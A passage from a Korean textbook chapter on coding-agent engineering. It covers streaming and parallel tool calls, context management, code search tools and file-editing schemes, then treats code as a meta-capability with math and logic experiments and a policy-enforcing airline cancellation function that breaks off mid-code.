위의 작업 흐름은 이상적인 상태입니다. 이를 실무에서 정말로 돌아가게 하려면 몇 가지 구체적인 구현 기법이 필요합니다——사고의 품질을 유지하면서 응답 속도를 끌어올리고 컨텍스트 소모를 낮추는 것입니다. 이들은 제2장, 제4장에서 논의한 범용 Agent 기술이 프로그래밍 영역에 구체적으로 적용된 것입니다.

**병렬 도구 호출, 스트리밍 실행, 연쇄 중단.**

전통적인 Agent 구현은 대개 직렬 방식을 채택합니다: 도구 호출 하나를 생성하고, 실행을 완료하고, 결과를 받은 뒤 다음 단계를 결정합니다. 이런 엄격한 순차 대기는 대량의 시간을 낭비합니다.

현대 Coding Agent는 스트리밍 응답을 충분히 활용해야 합니다: 제2장은 모델 출력 순서를 논의하면서 이 메커니즘을 소개했습니다——첫 번째 도구 호출의 매개변수가 완전히 생성되고 검증을 통과하는 즉시 실행을 시작할 수 있으며, 모델이 후속 도구 호출을 생성하기를 기다릴 필요가 없습니다. 예를 들어 모델이 한 번의 추론에서 코드 검색, 설정 파일 조회, 로그 읽기라는 세 도구 호출을 연속으로 출력해야 한다면, 첫 번째 호출의 매개변수가 완전하게 검증을 통과하는 즉시 실행을 시작할 수 있어 나머지 두 호출의 생성 과정과 겹쳐서 진행됩니다. 서로 독립적인 호출끼리는 순서를 기다리지 않고 병렬로 실행될 수도 있습니다. 이런 중첩 실행은 종단 간 지연을 크게 낮춰 Agent의 응답을 더 민첩하게 만듭니다.

병렬 실행의 또 다른 면은 장애 처리입니다. 각 도구 정의는 자신이 동시 실행을 지원하는지 선언해야 합니다(기본값은 지원 안 함, 실패 안전). 어떤 호출이 실패하면, 연쇄 중단 메커니즘을 통해 같은 배치에서 함께 시작되어 그 결과에 의존하는 다른 호출들을 종료시키되, 독립적인 호출이나 상위 작업에는 영향을 주지 않습니다——이는 바로 Harness 엔지니어링 절의 "장애 경계 통제" 원칙이 구체적으로 구현된 것입니다.

**컨텍스트의 정교한 관리.**

Coding Agent가 마주하는 근본적인 도전은 코드베이스가 보통 크지만, 모델의 컨텍스트 윈도는 유한하다는 것입니다. 첨단 모델이 백만 단위 토큰을 지원한다고 해도, 전체 코드베이스를 통째로 컨텍스트에 밀어넣는 것은 경제적이지도 필요하지도 않습니다. 지능적인 컨텍스트 관리는 여러 층위에서 전개되어야 합니다.

파일 읽기 층위에서, Agent는 늘 파일 전체 내용을 읽어서는 안 됩니다. 큰 파일의 경우 도구가 줄 번호 범위로 특정 조각을 읽는 것을 지원해야 합니다——수천 줄짜리 파일 전체를 로드하지 않고 100번째부터 150번째 줄만 읽는 식입니다. 더 중요한 것은, 내용을 반환할 때 줄 번호 표기를 첨부하는 것입니다——각 줄의 코드 앞에 실제 줄 번호를 접두어로 붙입니다. 이 단순해 보이는 설계는 큰 가치를 가져옵니다: 모델이 "`src/main.py`의 42번째 줄에서"라고 정확히 언급할 수 있어, 모호함을 줄이고 후속 편집 작업을 더 신뢰할 수 있게 만듭니다.

명령 실행 층위에서, 터미널 출력의 처리도 마찬가지로 신중해야 합니다. 컴파일이나 테스트는 수천 줄의 출력을 낼 수 있으며, 이를 전부 컨텍스트에 주입하면 예산이 빠르게 소진됩니다. 제4장에서 소개한 긴 출력 잘라내기 및 지속화 메커니즘이 여기서 광범위하게 적용됩니다: 출력의 앞부분 몇 줄(보통 오류 컨텍스트를 포함)과 뒷부분 몇 줄(보통 오류 요약을 포함)을 보존하고, 중간은 한 줄의 안내로 대체하며, 전체 출력이 임시 파일에 저장되어 필요할 때 볼 수 있음을 설명합니다.

**환경 정보의 동적 주입.**

이는 제2장에서 소개한 Agent 상태바 기술이 Coding Agent에서 집중적으로 구현된 것입니다. 범용 Agent와 달리 Coding Agent는 실행 환경의 상태에 크게 의존합니다. 매번 추론 전에 컨텍스트 끝부분에 Agent 상태바 형태로 다음과 같은 핵심 환경 정보를 주입해야 합니다:

- **현재 작업 디렉터리**: 경로 참조 오류를 방지
- **git 브랜치**: 자신이 메인 브랜치인지 특성 브랜치인지 파악
- **최근 커밋 기록**: 프로젝트의 진화 맥락을 이해
- **스테이징되지 않은 변경과 스테이징된 변경의 개요**: 이미 어떤 수정을 했는지 명확히 파악

이런 정보는 정적 시스템 프롬프트에 하드코딩되어서는 안 됩니다——그렇게 하면 KV 캐시 효율이 깨집니다——대신 동적으로 추가되는 Agent 상태바 형태로 실시간 생성되어 주입되어야 합니다. 이런 방식을 통해 Agent는 "환경 인지" 능력을 얻어, 매 결정이 낡은 가정이 아니라 현재 상태에 대한 정확한 이해에 기반하게 됩니다.

**명령 실행 환경의 상태 지속화.**

코드와 상호작용할 때 많은 작업이 환경 상태에 의존합니다: 디렉터리 전환, 가상 환경 활성화, 환경 변수 설정, 백그라운드 서비스 시작. 매번 명령이 완전히 새로운 셸에서 실행된다면 이런 상태는 모두 사라집니다——Agent가 방금 `cd`로 프로젝트 디렉터리로 전환했는데, 다음 명령이 다시 루트 디렉터리로 돌아가버려, 같은 설정을 반복해야 합니다. 더 심각한 것은, 일부 작업(예: Python 가상 환경 활성화)의 효과는 현재 셸 세션에서만 유효하고 세션을 넘나들며 전달될 수 없다는 것입니다.

따라서 지속적인 터미널 세션을 유지해야 하며, Agent가 시작할 때 생성되어 전체 상호작용 과정 동안 활성 상태를 유지해야 합니다. 매번의 명령은 이 공유 터미널에서 실행되어 작업 디렉터리, 환경 변수, 세션 상태를 보존합니다. 이런 설계는 인간 개발자의 작업 습관에 더 부합합니다——우리는 보통 하나의 장기 실행 터미널 창에서 작업합니다. 물론 Agent는 병렬 작업을 지원하기 위해 격리된 터미널을 시작할 능력도 유지해야 하지만, 지속적 세션이 기본 모드여야 합니다.

**즉각적인 문법 피드백 메커니즘.**

이는 다시 한번 Agent 상태바 기술의 가치를 보여줍니다. Agent가 코드를 수정한 후, 사용자가 명시적으로 테스트를 요청할 때까지 기다렸다가 문법을 검사해서는 안 됩니다. 더 효율적인 방법은: 파일 쓰기 작업이 완료되는 즉시, 도구 층이 자동으로 해당 linter나 문법 검사기를 실행해 검사 결과를 도구 반환값의 일부로 Agent에게 제시하는 것입니다. 문법 오류가 감지되면 Agent는 다음 라운드 추론에서 즉시 상세한 오류 메시지를 보게 됩니다——프로그래머가 IDE에서 괄호를 잘못 쳤을 때 에디터가 즉시 빨간 줄을 그어 알려주는 것과 같습니다. 이런 즉각적인 피드백 메커니즘은 오류 수정 비용을 크게 낮춥니다. Agent가 오류가 발생한 바로 그 순간에 수정할 수 있어, 테스트를 실행할 때까지 기다렸다가 문제를 발견할 필요가 없기 때문입니다.

이 다섯 가지 구현 기법——병렬과 스트리밍, 컨텍스트 관리, 환경 인지, 상태 지속화, 즉각적 피드백——은 함께 효율적인 Coding Agent의 기술적 기반을 구성합니다. 이들은 고립된 최적화 지점이 아니라 서로 맞물리는 설계 결정으로, 함께 하나의 목표를 가리킵니다: Agent가 경험 많은 개발자처럼 유창하게 작업할 수 있게 하는 것입니다.

### Coding Agent 속 검색 도구

거대한 코드베이스에서 관련 코드를 찾아내는 것은 Coding Agent 작업의 출발점입니다. 그림5-3은 서로 보완적인 여러 검색 도구를 비교해, 성숙한 Coding Agent가 작업 성격에 따라 어떻게 검색 방식을 선택해야 하는지 보여줍니다.

![그림5-3 Coding Agent 검색 도구 비교](images/fig5-3.svg)


**정규표현식 내용 매칭**(grep/ripgrep): 가장 전통적인 검색 방식으로, 파일 내용을 한 줄씩 스캔하며 패턴 매칭을 수행합니다. Agent가 찾으려는 구체적인 텍스트(함수명, 변수명, 오류 메시지)를 알고 있을 때 모든 등장 위치를 빠르고 정확하게 찾아낼 수 있습니다. 정규표현식(특수 기호로 텍스트 패턴을 기술하는 문법, 예를 들어 `def handle.*`는 `handle`로 시작하는 모든 함수 정의와 매칭)의 강력한 표현력은 복잡한 패턴을 포착할 수 있어, 문자 그대로의 텍스트뿐 아니라 특정 구조를 만족하는 코드 조각도 검색할 수 있습니다. 실제 사용에서는 파일 타입 필터링(Python 파일만 검색)과 경로 패턴 필터링(테스트 디렉터리 제외)도 지원해 노이즈를 줄여야 합니다. 근본적인 한계는 텍스트상으로 매칭되는 내용만 찾을 수 있고 의미를 이해하지 못한다는 것입니다——"사용자 인증"을 검색할 때, "인증"이라는 두 글자가 없지만 실제로는 로그인 로직을 처리하는 함수는 찾을 수 없습니다.

**파일명 패턴 매칭**(glob): 파일 내용을 보지 않고, 파일 시스템의 경로 구조에서만 패턴에 맞는 파일을 찾습니다. 예를 들어 `**/*.test.ts`는 모든 TypeScript 테스트 파일을 재귀적으로 찾고, `src/components/**/Button.tsx`는 components 아래 임의 깊이에서 Button.tsx를 찾습니다. 내용 검색보다 훨씬 빠르며(파일을 열어 읽을 필요가 없음), Agent가 프로젝트 구조를 탐색하는 첫걸음입니다——전체 파일 시스템을 빠르게 스캔해 프로젝트의 조직 틀을 세웁니다.

**시맨틱 코드 검색**: 앞의 두 정확 매칭 방법과 달리, 쿼리와 코드의 "의미"를 이해하려 시도합니다. 두 가지 핵심 문제를 풀어야 합니다:

- **구조 인지 청킹**: 코드는 엄격한 문법 구조를 가지므로, 고정된 문자 수가 아니라 함수, 클래스, 메서드 같은 완전한 의미 단위로 분할해야 합니다.
- **하이브리드 검색**(제3장에서 이 기술 스택을 자세히 소개함): 벡터 임베딩(밀집 임베딩)은 의미는 비슷하지만 표현이 다른 코드를 찾는 데 강합니다(예를 들어 "사용자 신원 검증"을 검색하면 `check_credentials`라는 함수를 찾을 수 있음). 키워드 매칭(BM25, 단어 빈도와 문서 길이에 기반한 고전적 검색 알고리즘)은 함수명과 변수명을 정확히 매칭하는 데 강합니다. 둘을 병렬로 실행한 뒤 재순위화 모델(reranker, 교차 인코더로 후보 결과를 정교하게 관련성 순위 매김)로 합쳐 순위를 매겨 상호 보완합니다.

시맨틱 검색은 익숙하지 않은 코드베이스에서 "데이터베이스와 상호작용"이나 "사용자 입력 검증 처리"와 관련된 코드를 찾는 탐색적 작업에 특히 적합합니다.

다만 시맨틱 검색을 위해 임베딩 인덱스를 구축할 가치가 있는지에 대해서는 업계에서 뚜렷한 노선 다툼이 존재합니다. Claude Code로 대표되는 터미널형 Agent는 의도적으로 **임베딩 인덱스를 구축하지 않고**, 순수하게 agentic한 grep + glob 현장 검색에 의존합니다——이렇게 하면 코드가 진화하면서 계속 낡아가는 인덱스를 유지할 필요도, 인덱스 기반 시설 전체를 갖출 필요도 없고, 코드 임베딩을 제3자 서비스로 유출할 위험도 피할 수 있습니다. Cursor 같은 IDE형 도구는 반대 노선을 걷습니다: **파일을 넘나드는 시맨틱 리콜**을 위해 인덱스 구축 비용을 기꺼이 지불하며, 임베딩 인덱스에 의존해 대형 코드베이스에서 의미상 관련은 있지만 표현이 다른 조각을 빠르게 찾아냅니다. 두 노선의 취사선택은 본질적으로 "기반 시설과 데이터 유출 대가"와 "파일을 넘나드는 시맨틱 리콜의 수익" 사이의 트레이드오프입니다.

**심볼 수준 정의와 참조 찾기**: IDE의 "정의로 이동", "모든 참조 찾기" 능력(LSP, 즉 Language Server Protocol, 언어 서버 프로토콜——에디터와 언어 분석 엔진이 통신하도록 하는 표준 프로토콜)에 기반해, 동명 심볼의 정의와 호출을 구분할 수 있습니다——예를 들어 `authenticate`가 42번째 줄에서는 함수 정의이고 189번째 줄에서는 호출임을 알지만, 텍스트 검색은 그 문자열이 포함된 모든 줄만 찾을 수 있습니다. 코드 리팩터링에 특히 핵심적입니다——함수 이름을 바꿀 때 텍스트 검색만으로는 부족합니다(함수명이 주석이나 문자열에도 등장할 수 있으므로), 반드시 심볼 검색을 통해 정의와 모든 실제 호출 지점을 정확히 찾아내야 합니다.

이 네 가지 검색 방식은 상호 보완적인 도구함을 구성하며, 실무에서는 종종 조합해서 사용합니다: 먼저 시맨틱 검색으로 관련 모듈을 찾고, 정규표현식 매칭으로 구체적인 코드 줄을 정확히 찾은 뒤, 마지막으로 심볼 검색으로 호출 체인을 추적합니다——"거칠게에서 세밀하게, 의미에서 문법으로" 가는 점진적 전략입니다.

### Coding Agent 속 파일 편집 도구

파일 편집의 난점은 조작 자체가 아니라, LLM이 "어디를 어떻게 고칠지"를 효율적이면서도 신뢰할 수 있게 시스템에 전달하는 방법에 있습니다. 그림5-4는 다섯 가지 파일 편집 방안을 비교해, 인간 언어 표현과 기계의 정확한 실행 사이의 근본적 긴장을 보여줍니다.

![그림5-4 다섯 가지 파일 편집 방안 비교](images/fig5-4.svg)


**차이 서술 + Apply Model**: 모델이 파일을 어떻게 편집할지 직접 지정하는 대신, 변경 서술을 생성합니다——git diff(즉 `git diff` 명령의 출력 형태로, "몇 줄이 지워지고 몇 줄이 추가됐는지")와 비슷한 차이 텍스트일 수도 있고, 생략 표시가 있는 코드 골격(수정되지 않은 부분을 "여기는 그대로 유지" 같은 주석으로 건너뜀)일 수도 있습니다. 이 서술은 이후 전문 "적용 모델"(Apply Model)——보통 더 작고 빠른 또 다른 LLM——에게 넘겨져 원본 파일과 병합해 완전한 새 파일을 만듭니다. 이런 관심사 분리 설계는 메인 모델이 상위 코드 로직에 집중하고, 적용 모델이 하위 텍스트 조작에 집중하게 합니다. 단순한 구현의 취약점은 병합 단계에 있습니다: 변경 서술과 파일의 실제 코드에 미세한 차이가 있으면 같은 위치인지 판단해야 하고, 유사한 코드 조각이 여러 개 있으면 잘못된 위치에 병합될 수 있습니다. Cursor는 이 노선이 지속적으로 진화한 대표 사례입니다: 메인 모델이 생략 표시가 있는 코드 골격을 출력하면, 전문적으로 훈련된 fast-apply 소형 모델이 완전한 파일을 다시 작성하며, 추측 디코딩(speculative decoding, 원본 파일 내용을 초안으로 삼아 병렬 검증)을 활용해 병합 속도를 초당 수천 토큰까지 끌어올립니다——공학적 투자로 이 노선의 신뢰성과 속도를 맞바꾼 것입니다.

**옛 문자열에서 새 문자열로**(Old String → New String): Claude Code가 채택한 방안입니다. 모델이 old string(교체될 원문)과 new string(교체 후 새 텍스트)을 제공하면, 프레임워크가 단순한 문자열 검색 후 교체를 실행합니다. 장점은 예측 가능성과 투명성입니다——old string이 파일에 존재하고 유일하면 성공하고, 그렇지 않으면 실패하며, 모호함이 없습니다. 대가는, 큰 규모의 코드를 삭제할 때 원본 내용 전체를 완전히 출력해야 하고 한 글자만 어긋나도 매칭이 실패한다는 것입니다; 같은 코드가 여러 번 등장하면 모호함을 없애기 위해 더 긴 맥락을 제공해야 합니다.

**줄 번호 위치 지정**(Old Line Numbers → New String): 모델이 "X부터 Y줄까지 삭제하고 새 내용을 삽입"이라고 지정합니다. 줄 번호는 정확하고 모호함이 없으며, 큰 규모 삭제는 숫자 두 개면 충분합니다. 하지만 모델이 줄 번호를 "세는" 것은 실수하기 쉬운데, 특히 파일이 길 때 그렇습니다. 실무에서는 보통 파일을 읽을 때 각 줄에 줄 번호 표기를 붙여 이를 완화하지만, 매번 편집 후 후속 줄 번호가 바뀌므로 여러 곳을 동시에 편집하는 병렬성이 제한됩니다.

**Vim류 편집 명령**: Vim 에디터의 명령 체계를 본떠, 복사, 잘라내기, 붙여넣기 등 풍부한 조작을 지원합니다. 코드 재구성(함수를 한 곳에서 다른 곳으로 옮기는 것)에는 매우 효율적입니다. 하지만 명령 문법의 학습 부담이 커서, 가장 강한 모델은 잘 사용할 수 있지만 더 작은 모델은 오류율이 뚜렷하게 올라갑니다.

**문자열 시작-끝 매칭**(Old String Start + End → New String): 옛 문자열 교체 방안의 개선판으로 볼 수 있습니다. 모델이 완전한 old string을 출력할 필요 없이, 삭제할 내용의 시작 몇 줄과 끝 몇 줄만 제공하고 중간 부분은 생략할 수 있습니다. 프레임워크는 이 시작과 끝을 매칭해 교체 영역을 찾아내며, 이 "시작-끝" 조합이 파일 내에서 유일하기만 하면 정확하게 위치를 찾을 수 있습니다. 이 방안은 텍스트 교체의 신뢰성과 줄 번호 방안의 효율성을 종합합니다——큰 규모의 코드 삭제를 처리할 때 수백 줄의 원본 코드를 출력할 필요 없이 경계만 보여주면 됩니다. 동시에 여전히 추상적인 줄 번호가 아니라 내용 매칭에 기반하므로 모델이 실수할 위험도 상대적으로 낮습니다.

**실무 권고**. 종합해보면, 주류 Coding Agent는 두 노선에서 각각 대표주자를 갖습니다: Claude Code는 "옛 문자열에서 새 문자열로" 방안을 채택합니다——신뢰성 우선, 구현이 간단하고, 추가 모델이 필요 없습니다. Cursor는 Apply Model 노선을 극한까지 밀어붙였습니다——전용 fast-apply 모델의 훈련과 추론 투자로 더 높은 편집 처리량을 얻습니다. 직접 Agent를 구축한다면, "옛 문자열에서 새 문자열로"가 가장 안전한 출발점입니다; 큰 규모의 수정을 다룰 때는 "문자열 시작-끝 매칭"이 더 경제적인 절충안입니다; 줄 번호 방안은 IDE와 깊이 통합된(에디터가 실시간으로 줄 번호 매핑을 유지하고, 매번 편집 후 즉시 모델에 다시 공급할 수 있는) 시나리오에서만 신뢰성을 가지며, 그렇지 않으면 줄 번호 드리프트로 쉽게 실패합니다.

## 코드: 범용 Agent의 메타 능력

앞부분은 신뢰할 수 있는 Coding Agent를 어떻게 구축하는지——아키텍처 설계부터 도구 구현, Harness 엔지니어링까지——보여줬습니다. 하지만 코드 생성의 가치는 프로그램 작성에 그치지 않습니다.

> **"메타 능력"이란 무엇인가?** 일반적인 능력은 Agent가 어떤 구체적인 일——질문에 답하기, 특정 API 호출하기, 텍스트 생성하기——을 할 수 있는 것입니다. **메타 능력**(meta-capability)은 "다른 능력을 만들어낼 수 있는" 능력입니다: Agent가 그것을 이용해 그 자리에서 새 도구, 새 제약, 새 표현 형태를 써서 작업을 완수하며, 모든 능력을 사전에 미리 준비해둘 필요가 없습니다. 코드 생성이 바로 이런 메타 능력입니다——정확하고, 실행 가능하고, 조합 가능하기 때문에, 새 도구(스크립트, API 호출 시퀀스)도 만들어낼 수 있고, 새 제약(단언문, 검증 규칙)도 만들어낼 수 있으며, 새로운 표현 형태(HTML 폼, PPT, 영상 프레임)도 만들어낼 수 있습니다.

바로 이 때문에, 코드가 Agent 체계에서 맡는 역할은 "프로그램 작성"을 훨씬 넘어섭니다. 이어지는 여섯 절에서는 이런 메타 능력이 프로그래밍을 넘어 발휘되는 여섯 가지 방향을 각각 보여줍니다: (1) 사고 도구——코드로 자연어를 대체해 엄밀한 추론을 수행; (2) 비즈니스 규칙 제약——코드로 정책을 고정해 모델의 환각을 방지; (3) 멀티미디어 생성——코드로 PPT/영상/시각화를 생성; (4) 시스템 어댑터——코드로 이질적인 API를 연결; (5) 생성형 UI——코드로 동적으로 폼과 인터페이스를 생성; (6) 자기 부트스트래핑——코드로 새 Agent를 창조.

이 여섯 방향은 병렬로 나열된 것이 아니라, "메타 능력이 작용하는 대상"에 따라 안에서 밖으로 조직되어 있습니다:

1. **사고 그 자체**——오류 나기 쉬운 자연어 추론을 코드로 대체(사고 도구);
2. **비즈니스 규칙**——모호한 정책을 실행 가능한 제약으로 코드화(비즈니스 규칙 제약);
3. **콘텐츠 표현**——PPT, 영상, 시각화 산출물을 생성(멀티미디어 생성);
4. **시스템 인터페이스**——이질적인 API를 연결하고, 데이터 형식 진화에 자동으로 적응(시스템 어댑터);
5. **사용자 인터페이스**——폼과 상호작용 인터페이스를 동적으로 구축(생성형 UI);
6. **Agent 자신**——코드로 새 Agent를 창조해 자기 부트스트래핑을 이룸(제8장의 가중치를 바꾸지 않는 "자기 진화"와 구별됨).

이 "안에서 밖으로, 결국 자기 자신으로 돌아오는" 맥락을 따라 읽으면 코드가 메타 능력으로서 갖는 통일된 가치를 더 명확히 볼 수 있습니다. 필요에 따라 새 도구를 만드는 것은 이 메타 능력의 더 나아간 확장이며, 제8장에서 전개합니다.

### 사고 도구로서의 코드

LLM은 자연어 이해와 생성에서 놀라운 성능을 보이지만, 정밀 계산, 기호 조작, 엄밀한 논리 추론에서는 근본적인 약점을 가지고 있습니다. 원인은 이렇습니다: 모델의 사고는 본질적으로 확률적이고 근사적인데, 수학과 논리 문제는 확정적이고 정확한 답을 요구합니다. 구체적인 대비로 설명해보겠습니다:

```
문제: "한 반에 40명의 학생이 있습니다. 그중 60%가 수학을 선택했고, 45%가 물리를 선택했으며,
      25%가 두 과목 모두 선택했습니다. 물리만 선택하고 수학은 선택하지 않은 학생은 몇 명입니까?"

순수 자연어 추론 (오류 나기 쉬움):        코드 추론 (정확하고 검증 가능):
"60%가 수학 선택 = 24명,                   math = int(40 * 0.60)    # 24
 45%가 물리 선택 = 18명,                   phys = int(40 * 0.45)    # 18
 25%가 둘 다 선택 = 10명,                  both = int(40 * 0.25)    # 10
 물리만 선택 = 24 - 10 = 14명"             only_phys = phys - both  # 8
→ 잘못 수학 인원에서 뺐음, 오답            → print(only_phys)  # 8 ✓
```

LLM이 문제를 이해하고 코드를 작성하는 일을 맡고, 코드 인터프리터가 정확한 계산을 맡게 함으로써——이런 분업은 둘이 각자 잘하는 일을 하게 합니다.

Mathematica 창시자 Stephen Wolfram은 이에 대해 깊은 통찰을 제시했습니다. LLM이 등장하기 전에도, 이미 정확한 수학 계산을 할 수 있는 시스템 부류가 존재했습니다——이들은 **기호 계산**(Symbolic Computation) 방식으로 작동합니다. 즉 근사적인 수치가 아니라 수학 기호로 표현식을 처리합니다. 예를 들어 일반 계산기는 $\sqrt{2}$를 1.414로 계산하지만, 기호 계산 시스템은 $\sqrt{2}$의 정확한 형태를 유지하다가 필요할 때만 소수로 변환합니다. Wolfram이 만든 Wolfram Alpha가 바로 이런 시스템으로, 사용자가 수학 문제를 입력하면 정확한 답을 반환합니다. 그러나 그것의 자연어 이해는 상당히 취약하고 커버리지도 좁습니다——내장된 문법 파싱에 의존해, 인식할 수 있는 질문 방식이 제한적이며 질문 방식이 조금만 바뀌어도 파싱에 실패할 수 있고, 개방 도메인의 다단계 추론은 처리할 수 없습니다. LLM은 마침 이 약점을 보완합니다——다양한 자연어 표현을 이해하는 데는 뛰어나지만 정밀 계산에는 뛰어나지 않습니다. 새로운 협업 모델은 이렇습니다: LLM이 사용자의 자연어 문제를 이해하고 그 안의 수학적·논리적 구조를 식별해 형식 언어(예: Mathematica 언어나 Python의 SymPy 라이브러리)로 변환하는 일을 맡고, 이를 전문 기호 계산 엔진이나 제약 솔버에 넘겨 실행해 정확한 결과를 얻습니다.

> **실험 5-1 ★★: 코드 생성 도구를 사용한 수학 문제 해결 능력 향상**
>
> **실험 목표**: Agent가 Code Interpreter를 통해 수학적 사고를 보조받았을 때 정확도가 향상됨을 검증.
>
> **기술 방안**: sympy, numpy, scipy 등 수학 라이브러리가 설치된 Python 샌드박스를 Agent에게 제공. Agent가 수학 문제를 만나면 이를 Python 코드로 형식화: sympy는 기호 계산(미적분, 방정식 풀이)을 수행, scipy는 수치 최적화, numpy는 행렬 연산을 수행. 생성된 코드는 샌드박스에서 실행되어 정확한 결과를 반환.
>
> **인수 기준**: AIME 스타일 문제(미국 수학 초청 시험에 대응)로 평가. 순수 사고 체인 사고와 코드 보조 사고의 정확도를 비교해, 코드 보조 모드가 유의미하게 높아야 함. 코드가 수학 라이브러리를 올바르게 사용하는지, 풀이 과정이 논리적으로 명료한지 검사.
>

> **실험 5-2 ★★: 코드 생성 도구를 사용한 논리적 사고 능력 향상**
>
> **실험 목표**: Agent가 제약 풀이 코드를 통해 논리적 사고를 보조받는 능력을 평가.
>
> **기술 방안**: python-constraint 라이브러리가 포함된 Code Interpreter를 Agent에게 제공. Agent가 논리 퍼즐(예: 기사와 무뢰한 문제)을 형식적 제약 정의로 변환: 모든 변수(각 섬 주민의 신원)를 식별, 제약 조건("기사는 진실을 말한다" 등의 추론)을 식별해, 제약을 정의하고 솔버를 호출해 모든 제약을 만족하는 해를 탐색.
>
> **인수 기준**: [K&K Puzzle 데이터셋](https://huggingface.co/datasets/K-and-K/perturbed-knights-and-knaves)으로 평가, 코드 보조 모드의 풀이 정확도가 90% 이상 달성, 순수 사고 모드보다 유의미하게 높아야 함.
>

이 실험은 더 보편적인 규칙 하나를 밝혀줍니다: 모델과 스캐폴드(harness) 사이는 서로를 상쇄하는 관계입니다. 모델이 충분히 강할 때는 스캐폴드가 더 얇아질 수 있습니다——모델 스스로 논리를 옳게 생각할 수 있으므로, 코드 솔버가 가져오는 이득이 좁아집니다. 모델이 충분히 강하지 않을 때는 스캐폴드가 더 많은 일을 해야 합니다——핵심 논리 추론을 코드와 제약 솔버에 맡겨 정확성을 담보해야 합니다. 바로 이 때문에 본 실험은 의도적으로 능력이 약한 모델을 골라 이 대비를 확대했습니다: 더 약한 모델에서는 순수 사고 모드가 빈번히 계산 오류를 내고, 코드 보조는 정확도를 크게 끌어올릴 수 있습니다. 반면 충분히 강한 추론 모델로 바꾸면 순수 사고만으로도 대개 모든 퍼즐을 풀 수 있어, 코드 보조의 이득은 0에 가깝게 수렴합니다. 그러므로 스캐폴드를 얼마나 두껍게 만들지는 손에 쥔 모델의 능력 경계에 달려 있습니다——이는 Agent 기술을 평가할 때 간과되기 쉬운 전제이기도 합니다: 같은 스캐폴드라도 능력이 다른 모델을 붙이면 완전히 다른 결론이 나올 수 있습니다.

### 비즈니스 규칙의 제약으로서의 코드

이 절은 앞의 Harness 엔지니어링에 대한 직접적인 응답입니다. Harness의 핵심 원칙 중 하나는 "제약: 문서화가 아니라 코드화"——규칙을 자연어 문서에서 실행 가능한 코드로 전환해, 시스템 행동에 대한 제안이 아니라 강제 제약이 되게 하는 것입니다. 코드 생성은 Agent가 이 전환 과정을 자율적으로 완수할 수 있게 합니다.

비즈니스 규칙, 업무 프로세스, 의사결정 로직은 자연어로만 서술하면 종종 모호함으로 가득합니다. "합리적인 환불 요청"이란 무엇일까요? "긴급 상황"이란 무엇으로 간주할까요? 이런 개념의 경계는 자연어로는 정하기 어렵습니다——"구매 후 7일 이내 환불 가능"은 명확해 보이지만, "7일"은 일반일인가 영업일인가? "구매"는 주문 시점인가 발송 시점인가? 이에 비해 코드는 모호함 없는, 실행 가능한 지식 표현 방식을 제공합니다——성공적으로 실행되거나 오류를 던지거나 둘 중 하나이지, 애매함이 존재하지 않습니다.

**복잡한 비즈니스 규칙의 정확한 표현.**

**자연어 규칙 vs 코드화 규칙: 대체가 아닌 상호보완**

규칙을 시스템 프롬프트에 적어두는 것의 장점: 모델이 규칙에 기반해 사용자에게 **정책을 설명**할 수 있음; 규칙에 기반해 **우회 방안을 찾을** 수 있음(예: "취소가 아닌 일정 변경"); 도구 호출 전에 실행 가능성을 초보적으로 판단할 수 있음.

규칙을 검증 도구로 코드화하는 것의 장점: 코드 로직의 **정확성과 무모호성**——"이해 편차"가 발생하지 않음; 코드 실행의 **결정성**——같은 입력은 반드시 같은 출력을 산출함; 특히 **복잡한 규칙 조합**에 적합——다중 조건 불리언 조합, 시간 계산, 여러 데이터 소스에 걸친 검증.

실무에서는 결합해서 사용해야 합니다: 시스템 프롬프트에는 이해와 소통을 위한 자연어 규칙을 담고, 핵심 의사결정 지점에는 준수를 보장하는 "문지기" 역할의 코드화된 검증 도구를 갖춥니다.

코드화된 규칙의 진짜 가치는 토큰 효율 최적화에 있지 않고, **되돌릴 수 없는 잘못된 조작을 방지**하는 데 있습니다——주문 취소, 자금 이체, 데이터 삭제 같은 작업은 한 번 실행되면 되돌릴 수 없습니다. 코드화된 검증은 조작 전에 마지막 방어선을 설치하며, 이 안전 보장의 가치는 구현 비용을 훨씬 능가합니다.

**검증과 실행 병합: checklist가 사고를 이끌고, 진리값 검증이 문지기 역할**

독립적인 검증 도구를 설계하는 대신, 실행 도구 내부에서 먼저 검증하게 하는 편이 낫습니다. τ-bench(tau-bench, 항공·전자상거래 고객 서비스 시나리오를 모사해 Agent의 도구 호출과 정책 준수 능력을 전문적으로 평가하는 벤치마크 테스트)의 항공사 취소 정책을 예로 들어봅시다:

```python
def cancel_reservation(
    reservation_id: str,
    cancellation_reason: str,        # "change_of_plan", "airline_cancelled", "other"
    expected_cabin_class: str = None,    # 선택: 모델 자체 점검용, 서버가 데이터베이스 진리값으로 재검토
    expected_has_insurance: bool = None  # 선택: 모델 자체 점검용, 위와 동일
) -> dict:
    """
    항공편 예약을 취소합니다.

    취소 정책 (서버가 데이터베이스 진리값에 근거해 강제 집행):
    - 규칙 1: 이미 사용된 구간이 있는 예약은 취소 불가
    - 규칙 2: 예약 후 24시간 이내에는 무조건 취소 가능
    - 규칙 3: 항공사가 취소한 항공편은 항상 취소 가능
    - 규칙 4: 비즈니스석은 항상 취소 가능
    - 규칙 5: 베이직 이코노미와 이코노미는 여행자 보험을 구매해야 취소 가능

    호출 전 반드시 예약 상세 정보를 조회해 위 정책을 하나씩 확인할 것; expected_* 매개변수는
    당신의 판단 근거를 진술하는 데 쓰이며, 서버의 대조와 감사에만 참고되고 정책 판정에는 영향을 주지 않음.
    """
    # 모든 정책 사실은 예외 없이 데이터베이스에서 읽으며, 모델이 스스로 보고한 값은 절대 채택하지 않음
    r = db.get_reservation(reservation_id)
    now = server_clock.now()  # 모델이 제공한 것이 아니라 서버 시각

    # 모델의 자체 보고값과 진리값이 불일치하면 경고를 기록, 모델의 오인식이나 잠재적 주입 발견에 사용
    if expected_cabin_class is not None and expected_cabin_class != r.cabin_class:
        log_mismatch(reservation_id, "cabin_class", expected_cabin_class, r.cabin_class)
    if expected_has_insurance is not None and expected_has_insurance != r.has_insurance:
        log_mismatch(reservation_id, "has_insurance", expected_has_insurance, r.has_insurance)

    if r.any_segment_used:
        return {"success": False, "reason": "Cannot cancel with used segments"}

    hours_since_booking = (now - r.booking_time).total_seconds() / 3600
    if hours_since_booking <= 24:
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Cancelled within 24-hour window"}

    if r.flight_status == "cancelled_by_airline":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Airline cancelled flight"}

    if r.cabin_class == "business":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Business class cancellation"}

